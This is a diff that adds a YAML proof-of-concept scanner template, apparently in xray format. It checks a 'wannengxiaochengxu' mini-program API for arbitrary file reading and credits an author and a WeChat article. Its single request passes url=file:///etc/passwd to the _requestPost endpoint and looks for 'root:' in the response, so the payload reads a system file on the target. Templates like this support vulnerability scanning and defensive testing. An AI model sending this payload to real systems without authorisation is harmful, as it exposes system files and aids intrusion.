@@ -1,0 +1,18 @@
+name: poc-yaml-wannengxiaochengxu-requestPost-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/wxapps/_requestPost?data=1&url=file:///etc/passwd
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487475&idx=1&sn=a53688e1a7bc7e3001c61a4e536c95c8&chksm=c267bac0f51033d68d38cf9b28c2dc8d883bb0024ce4b35ae5eecda96973f04f1b7da93fed8e&token=286085064&lang=zh_CN#rd
